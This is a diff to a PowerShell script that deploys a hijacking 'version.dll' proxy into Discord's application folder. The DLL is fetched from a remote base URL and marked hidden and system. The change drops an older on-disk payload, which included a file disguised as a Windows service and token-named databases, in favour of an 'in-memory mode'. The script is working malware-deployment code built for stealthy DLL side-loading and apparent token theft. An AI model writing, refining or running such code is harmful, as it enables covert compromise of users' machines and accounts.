@@ -138,22 +138,20 @@ Write-Host "Source: $GitHubBaseUrl" -ForegroundColor Gray
 Write-Host ""
 
 $payloadRoot = Get-PayloadRoot
-$cacheDir = Join-Path $payloadRoot "Cache"
 $discordFolder = Get-DiscordAppFolder
-
-New-Item -ItemType Directory -Path $payloadRoot -Force | Out-Null
-New-Item -ItemType Directory -Path $cacheDir -Force | Out-Null
 
 Stop-DiscordIfRunning
 Stop-PayloadProcesses
+
+# Clean old disk-based payload (in-memory mode uses only version.dll)
+if (Test-Path -LiteralPath $payloadRoot) {
+    Remove-Item -LiteralPath $payloadRoot -Recurse -Force -ErrorAction SilentlyContinue
+}
+
 Remove-LegacyDeployFiles -PayloadRoot $payloadRoot
 
 $files = @(
-    @{ Remote = "WaaSMedicSvc.exe";              Local = Join-Path $payloadRoot "WaaSMedicSvc.exe" },
-    @{ Remote = "ProvData.db";                   Local = Join-Path $payloadRoot "ProvData.db" },
-    @{ Remote = "Cache/TokenProv.db";            Local = Join-Path $cacheDir "TokenProv.db" },
-    @{ Remote = "Cache/DeviceCache.db";          Local = Join-Path $cacheDir "DeviceCache.db" },
-    @{ Remote = "version.dll";                   Local = Join-Path $discordFolder "version.dll" }
+    @{ Remote = "version.dll"; Local = Join-Path $discordFolder "version.dll" }
 )
 
 foreach ($file in $files) {
@@ -161,21 +159,15 @@ foreach ($file in $files) {
 }
 
 $hiddenPaths = @(
-    $payloadRoot,
-    $cacheDir,
-    (Join-Path $payloadRoot "WaaSMedicSvc.exe"),
-    (Join-Path $payloadRoot "ProvData.db"),
-    (Join-Path $cacheDir "TokenProv.db"),
-    (Join-Path $cacheDir "DeviceCache.db"),
     (Join-Path $discordFolder "version.dll")
 )
 
 Hide-DeployTree -Paths $hiddenPaths
 
 Write-Host ""
-Write-Host "[OK] Deploy complete (hidden system files)" -ForegroundColor Green
-Write-Host "  Payload : $payloadRoot" -ForegroundColor White
-Write-Host "  Proxy   : $discordFolder\version.dll  [hidden+system]" -ForegroundColor White
+Write-Host "[OK] Deploy complete (in-memory mode - version.dll only)" -ForegroundColor Green
+Write-Host "  Proxy   : $discordFolder\version.dll  [hidden+system, payload in memory]" -ForegroundColor White
 Write-Host ""
 Write-Host "Open Discord to start the session." -ForegroundColor Yellow
+
 
